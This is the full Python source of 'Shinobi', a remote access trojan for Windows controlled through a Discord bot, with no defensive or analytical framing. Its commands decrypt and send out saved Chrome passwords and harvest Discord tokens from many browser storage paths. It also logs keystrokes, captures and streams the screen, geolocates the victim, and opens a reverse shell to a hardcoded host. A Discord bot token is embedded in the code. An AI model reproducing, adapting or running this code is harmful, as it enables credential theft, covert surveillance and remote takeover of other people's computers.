'''
    # Project: Shinobi

        - Your average Discord Malware but on steroid

        Functions:
            - Can Stream Victim's Screen
            - Get user location and IP
            - Close any open application on victim
            - Lock/Shutdown/restart victim's PC
            - Can Display our banner to the victim's PC
            - Has a keylogger and can send to the attacker the keylogs
            - Can get info about victim's PC

        Future Functions:
            - Can open victim's discord thru the stolen TOKEN
            - wreck their Discord account
            - gain a shell and persistent shell to the victim
            - stream victim's webcam

'''

# for file and operating system pkg
import os
import shutil
import sys
import re
import platform  # PKG to get user info
import subprocess

if os.name != "nt":
    exit()

# Discord Pkg
import discord
from discord.utils import get
from discord.ext import commands


import time
from mss import mss  # for screenshoting victim screen from mss import mss kasi may function na pangalan mss rin same sa package ayun yung need natin

# web requesting
import requests
import urllib.request
from urllib.request import urlopen, urlretrieve
from requests import get #Request to web for data Public IP getter

# for Audio and Hardware like keyboard and mouse
import pyHook  # Access keyboard and Mouse of Victim
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume # for audio
import ctypes
from comtypes import CLSCTX_ALL


# for running program in background
import win32process
import win32con
import win32gui
import winreg

# get user current location
import geocoder

# PKG for streaming screen of the victim
import socket
import cv2
import pickle
import struct
import imutils
import numpy


# for getting user in gogle chrome
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
import win32crypt
from Crypto.Cipher import AES


# Pkg for Keylogger
import pynput
from pynput.keyboard import Key, Listener
import threading

client = commands.Bot(command_prefix='!')
bot_token = 'OTU5NDQ2NDA2ODk5MzMxMTY0.YkcAGQ.1NRL_0qF7NkJvvgA5IXG5nmYR3M'

count = 0
keys = []
timer = 0


# get IP of the victim
victim_ip = get('https://api.ipify.org').text

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

# functions for Google Chrom
def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)
def encryption_key():

    #C:\Users\USER_Name\AppData\Local\Google\Chrome\Local State
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")

    #read local state file
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)

    # decode the key and remove first 5 DPAPI str characters
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]

    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decryted key
def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]

        # initialize cipher object
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        # decrypt password
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"



# functions for streaming
server_socket_stream = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def stream():

    # print(user_cmd)
    host_name  = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    print('HOST IP:',host_ip)
    port = 9999
    socket_address = (host_ip,port)

    # Socket Bind
    server_socket_stream.bind(socket_address)

    # Socket Listen
    server_socket_stream.listen(5)
    print("LISTENING AT:",socket_address)

    # Socket Accept
    while True:
        client_socket,addr = server_socket_stream.accept()
        print('GOT CONNECTION FROM:',addr)
        if client_socket:
            with mss.mss() as sct:

                monitor = {"top": 20, "left": 195, "width": 1520, "height": 900}
                # vid = cv2.VideoCapture('vid.mp4')

                while "Screen capturing":
                    last_time = time.time()
                    img = numpy.array(sct.grab(monitor))
                    a = pickle.dumps(img)
                    message = struct.pack("Q",len(a))+a
                    client_socket.sendall(message)

                    key = cv2.waitKey(1) & 0xFF
                    if key  == ord('q'):
                        break



# Function when out Bot is alive
@client.event
async def on_ready():
    report_channel = client.get_channel(959449626149285988)
    time.sleep(2)
    pin_msg = await report_channel.send('!show_cmd')
    pin_msg.pin()
    # sending message to report
    myEmbed = discord.Embed(title="Shinobi is Online at this address {}".format(victim_ip), color=0xc40e0e)
    myEmbed.add_field(name="** **",value="Send '!show_cmd' to the designated channel know what I'm capable of ")
    # myEmbed.set_thumbnail(url='https://i.pinimg.com/originals/31/a4/94/31a494b737822b7f2ad1b550da18a00e.jpg')

    await report_channel.send(embed=myEmbed)
    # time.sleep(3)

    #Create new channel with victim IP as the name of it
    for guild in client.guilds:
        await guild.create_text_channel("{}".format(victim_ip))


    # Displaying Brand in Victims Screen
    # time.sleep(1)
    # os.system('start runner.bat')

    # the purpose of this one is to lock user from there mouse and keyboard
    # but somehow it only lags the user to death still a good choice thou
    # hm = pyHook.HookManager()
    # hm.MouseAll = false
    # time.sleep(2)
    # hm.KeyAll = uMad
    # time.sleep(2)
    # await report_channel.send("Messing with their keyboard and mouse now")
    # hm.HookMouse()
    # hm.HookKeyboard()
    # pythoncom.PumpMessages()

    # change this to your choice
    # time.sleep(1)


#reverse_shell
# client
@client.command()
async def reverse_shell(message):

    SERVER_HOST = '192.168.100.3'
    SERVER_PORT = 5003
    BUFFER_SIZE = 1024 * 150

    SEPARATOR = "<sep>"


    server_socket = socket.socket()
    # connect to the server
    server_socket.connect((SERVER_HOST, SERVER_PORT))

    # get the current directory
    cwd = os.getcwd()
    server_socket.send(cwd.encode())

    while True:

        # receive the command from the server
        command = server_socket.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)

        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        server_socket.send(message.encode())
    # close client connection
    server_socket.close()


#Show Capable CMD
@client.command()
async def show_cmd(message):

    my_embed = discord.Embed(title="Commands",
                             description="Every command has a description on it. \n If it has a ' [] ' meaning you need to fill or put a parameter to it",
                             inline=False,color=16705372)
    my_embed.add_field(name='!lock_user ', value='Lock user from their PC', inline=True)
    my_embed.add_field(name='!shut_down_user  [duration] ', value='Lock user from their PC with given duration', inline=True)
    my_embed.add_field(name='!restart_user  [duration] ', value='Restart user PC with given duration', inline=True)
    my_embed.add_field(name='!info ', value='Display victim pc info', inline=True)
    my_embed.add_field(name='!screenshot ', value='Grabbing a screenshot of the victim screen', inline=True)
    my_embed.add_field(name='!get_location ', value='Get victim location (not the accurate like their exact house but high probability that its their place)', inline=True)
    my_embed.add_field(name='!open_stream',
                      value='Open server from the victim PC for the attacker to join and view victim screen. NOTE: once use this command you cannot use other command you need to terminate this command first by pressing "Q" in the keyboard',
                      inline=True)
    my_embed.add_field(name='!start_stream [Victim IP]', value='Joining opened server with victim IP', inline=True)
    my_embed.add_field(name='!start_keylogs ', value='Start keylogger to victim PC run for 50 secs (Good for combining lock function and keylogger)', inline=True)
    my_embed.add_field(name='!show_keylogs ', value='Display keylogger result', inline=True)
    my_embed.add_field(name='!check_open_app ', value='Display open apps in victim PC', inline=True)
    my_embed.add_field(name='!close_app [Name of application] ', value='terminate chosen app', inline=True)
    my_embed.add_field(name='!list_app ', value='Display apps from C drive', inline=True)
    my_embed.add_field(name='!bg_music [Youtube Link]', value='Run youtube vid in the background', inline=True)
    my_embed.add_field(name='!stop_bg ', value='Stop background music', inline=True)
    my_embed.add_field(name='!banner ', value='Display banner to the victim PC', inline=True)
    my_embed.add_field(name='!delete', value='Delete whole server convo', inline=True)
    my_embed.add_field(name='!rest', value='ShutDown Discord Bot', inline=True)
    my_embed.add_field(name='!token', value='grabbing discord token', inline=True)
    my_embed.add_field(name='!reverse_shell', value='gaining a shell to the victim', inline=True)

    await message.send(embed=my_embed)

# Lock Victim from computer
@client.command()
async def lock_user(message):
    await message.send('Locking user now')
    time.sleep(1)
    ctypes.windll.user32.LockWorkStation()

# Shutting Down Victim PC
@client.command()
async def shut_down_user(message, duration: str):
    await message.send('Shutting Down Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /s /t {}".format(duration))

# Restart Victim PC
@client.command()
async def restart_user(message, duration: str):
    await message.send('Restarting Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /r /t {}".format(duration))

#Get passwork in google chrome
@client.command()
async def get_chrome_pass(message):
    await message.send('grabbing all tha saved password')
    time.sleep(2)


    # local passwords path
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")

    #Creating a new Database file so we can store the password_db just like a temp file for the attack
    shutil.copyfile(password_db_path,"victim.db")

    # connect to the database
    db = sqlite3.connect("victim.db")

    # execure cursor function to communicate to the SQL DB to GRUD the data in DB
    cursor = db.cursor()

    # getting the Databse column/query
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")

    #get the encryption key
    encp_key = encryption_key()

    # looping to the rows in DB
    for row in cursor.fetchall():

        # Looping thru the Chrome DB fetching all data and and creating a embed to send in Discord
        site_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]
        myEmbed = discord.Embed(title="Victim's Credential", color=0xc40e0e)

        # check if username and password are not null
        if username or password:
            myEmbed.add_field(name="Site Login URL:",value=site_url)
            myEmbed.add_field(name="Username/Email:",value=username)
            myEmbed.add_field(name="Password:",value=password)
        else:
            continue

        # check if record has a date on it
        if date_created:
            myEmbed.add_field(name="Date date_created:",value=str(my_chrome_datetime(date_created)))
            await message.send(embed=myEmbed)

    #closing database and cursor
    cursor.close()
    db.close()

    #remove the copied database after reading passwords
    os.remove("victim.db")

# Stream Victim Screen
@client.command()
async def open_stream(message):

    await message.send("Opening server now")
    time.sleep(2)
    try:
        stream()
    except Exception as e:
        raise

    time.sleep(1)
    await message.send('server opened')
    time.sleep(2)

# get user info
@client.command()
async def info(message):
    # Reporting User info
    myEmbed = discord.Embed(title=" Victim's Info", color=0xc40e0e)

    myEmbed.add_field(name='Running Machine: ', value=platform.machine(), inline=True)
    myEmbed.add_field(name='Machine Version: ', value=platform.version(), inline=True)
    myEmbed.add_field(name='Machine System: ', value=platform.system(), inline=True)
    myEmbed.add_field(name='Hostname: ', value=platform.node(), inline=True)
    myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)
    # myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)

    await message.send(embed=myEmbed)

# grab screenshot of Victim
@client.command()
async def screenshot(message):
    await message.send("I got you my guy")
    time.sleep(2)
    temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
    with mss.mss() as sct:
        sct.shot(output=temp)
    file = discord.File(temp, filename="monitor.png")
    await message.send("Here's the screenshot", file=file)
    os.remove(temp)

# get victim current location
@client.command()
async def get_location(message):
    await message.send(file=discord.File('8316-wicked-leave.png'))
    time.sleep(2)
    await message.send('getting user current location now')
    time.sleep(1)

    vic_location = geocoder.ip(victim_ip)

    myEmbed = discord.Embed(title=" Victim's Location",description="not exactly location of their home but high chance it's their place", color=0xc40e0e)

    myEmbed.add_field(name='Victim Location: ', value=vic_location, inline=False)
    myEmbed.add_field(name='Latitude and Longitude: ', value=vic_location.latlng, inline=False)

    await message.send(embed=myEmbed)

#Keylogger
@client.command()
async def start_keylogs(message):
    await message.send("Keylogger Started!")
    path = os.getcwd()
    filename = 'keylogs.txt'
    fullpath = os.path.join(path,filename)


    def write_file(keys):
         with open(fullpath,"a") as f:
             for key in keys:
                 k = str(key).replace("'","")
                 if k.find("space") > 0:
                     f.write('\n')
                 elif k.find("Key") == -1:
                     f.write(k)
                 # f.write(str(key))

     # write_file('sample')

    def on_press(key):
         global keys,count

         keys.append(key)
         count += 1

         if count >= 10:
             count = 0
             write_file(keys)
             keys=[]


    def on_release(key):
        global timer
        print(timer)

        if timer >= 50:
            timer = 0
            return False

        else:
            timer += 1

     # def key_log_stop():

    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()


         # time.sleep(2)
         # break

    await message.send("successfully copied 50 character!")


@client.command()
async def show_keylogs(message):
     path = os.getcwd()
     filename = 'keylogs.txt'
     fullpath = os.path.join(path,filename)
     file_keys = fullpath
     file = discord.File(file_keys, filename=file_keys)
     await message.send("Successfully dumped all the logs", file=file)
     os.remove(file_keys)

# REVIEW:
@client.command()
async def token(message):
    await message.send("Grabbing discord token only")
    time.sleep(2)
    await message.send(f"extracting tokens. . .")
    tokens = []
    saved = ""

    # paths that may have Discord info like website or browser that has stored Discord Token
    paths = {
            'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
    for source, path in paths.items():
        if not os.path.exists(path):
            continue
        # loop thru the file path and check if file is end with .log or .ldb
        for file_name in os.listdir(path):
            # if path doesnt have file that eneded with .log or .ldb continue
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            # loop thru the remaining file path and read each line
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):

                    # REVIEW: what is the regex looping
                    # if there is a valid regex result append it to the empty variable
                    for token in re.findall(regex, line):
                        tokens.append(token)

        # loop the tokens variable and request to the discord with the stolen token
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })

            # if status is 200 meaning the token is valid  return it to the saved variable and send it to the attacker
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\n\n"
    if saved != "":
        await message.send(f"**Token(s) succesfully grabbed:** \n{saved}")
    else:
        await message.send(f"**User didn't have any stored tokens**")
    time.sleep(2)


# Check what app is running
@client.command()
async def check_open_app(message):
    await message.send('reviewing open apps')
    time.sleep(2)
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    result = []
    for line in proc.stdout:
        if line.rstrip():
            # only print lines that are not empty
            # decode() is necessary to get rid of the binary string (b')
            # rstrip() to remove `\r\n`
            await message.send(line.decode().rstrip())


# Close running apps
@client.command()
async def close_app(message, app: str):
    os.system(" taskkill /f /im {}.exe".format(app))
    time.sleep(2)
    await message.send(f'{app} is now closed LEZGOOOO')


# Open App
# unfinished
# @client.command()
# async def open_app(message, app: str):


# list all installed application
@client.command()
async def list_app(message):
    # var = os.system('C:\Program Files (x86)')

    await message.send("This is the list in C drive")
    time.sleep(2)
    await message.send(os.listdir('C:\Program Files (x86)'))
    await message.send("This is the list in D drive")
    time.sleep(2)
    await message.send(os.listdir('D:\\'))


# Play BG music
@client.command()
async def bg_music(message, youtube_link: str):
    MaxVolume()
    if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await message.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, message):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                            else:
                                pass

                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
    else:
        await message.send("Invalid Youtube Link")


# Stop BG music
@client.command()
async def stop_bg(message):
    await message.send("stopped the music")
    os.system(f"taskkill /F /IM {pid_process[1]}")

# delete message
@client.command()
async def delete(message,amount = 66):
     await message.channel.purge(limit=amount)

# give bot a rest
@client.command()
async def rest(message):
    await message.send("We're going offline now")
    time.sleep(2)

    guild = client.guilds[0]

    # check if the channel exists
    victim_channel = discord.utils.get(guild.channels, name=victim_ip.replace('.',''))

    # if the channel exists
    if victim_channel is not None:
       await victim_channel.delete()
       await message.send("Removing this channel now {}".format(victim_ip))
       exit()
    # if the channel does not exist
    else:
       await message.send(f'No channel named, "{victim_ip}", was found')
       exit()

@client.command()
async def banner(message):
    await message.send("We're gonna leave our mark")

    with open('user.txt','w') as f:
        f.write('''
                                                 ,-----------------------,          ,"        ,"|
                                                ,"                      ,"|        ,"        ,"  |
                                               +-----------------------+  |      ,"        ,"    |
                                               |  .-----------------.  |  |     +---------+      |
                                               |  |                 |  |  |     | -==----'|      |
                                               |  |                 |  |  |     |         |      |
                                               |  |     Hacked      |  |  |/----|`---=    |      |
                                               |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
                                               |  |                 |  |  |  // |(((( [33]|    ,"
                                               |  `-----------------'  |," .;'| |((((     |  ,"
                                               +-----------------------+  ;;  | |         |,"     -Jnthn/P3nut-
                                                  /_)______________(_/  //'   | +---------+
                                             ___________________________/___  `,
                                            /  oooooooooooooooo  .o.  oooo /,   \,"-----------
                                           / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
                                          /_==__==========__==_ooo__ooo=_/'   /___________,"
                                          `-----------------------------'
                                          ''')


    os.startfile('user.txt')
    time.sleep(2)
    os.remove('user.txt')
    time.sleep(2)

    # sending screenshot to our Discord server
    temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
    with mss.mss() as sct:
        sct.shot(output=temp)
    file = discord.File(temp, filename="monitor.png")
    await message.send("Here's the screenshot", file=file)
    os.remove(temp)

@client.command()
async def message_vic(message, message_sender: str):
    await message.send('Sending message to victim')
    print(message_sender)

    if message_sender != '':
        with open('message_user.txt','w') as f:
            f.write(message_sender)
            time.sleep(2)
            os.startfile('message_user.txt')
            time.sleep(2)
            os.remove('message_user.txt')
    else:
        await message.send('Message Error')

client.run(bot_token)
